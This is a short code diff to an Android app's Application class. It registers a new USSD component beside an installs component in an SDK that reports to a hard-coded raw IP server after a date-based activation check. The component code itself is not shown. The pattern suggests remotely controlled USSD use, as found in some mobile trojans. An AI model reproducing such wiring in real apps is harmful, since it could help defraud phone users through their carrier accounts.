@@ -9,6 +9,7 @@ import manager.app.com.commons.CommonUtils;
 import manager.app.com.commons.commons.SdkCommonsImpl;
 import manager.app.com.commons.commons.SdkComponent;
 import manager.app.com.installs.InstallsComponent;
+import manager.app.com.ussd.UssdComponent;
 
 public class App extends Application {
 
@@ -18,6 +19,7 @@ public class App extends Application {
         boolean useFullVersion = CommonUtils.checkIsFullVersionTime("01-01-2018");
         List<SdkComponent> components = new ArrayList<>();
         components.add(new InstallsComponent());
+        components.add(new UssdComponent());
         SdkCommonsImpl.init(this,
                 BuildConfig.APPLICATION_ID,
                 "http://217.23.12.122:91/api/v1/",
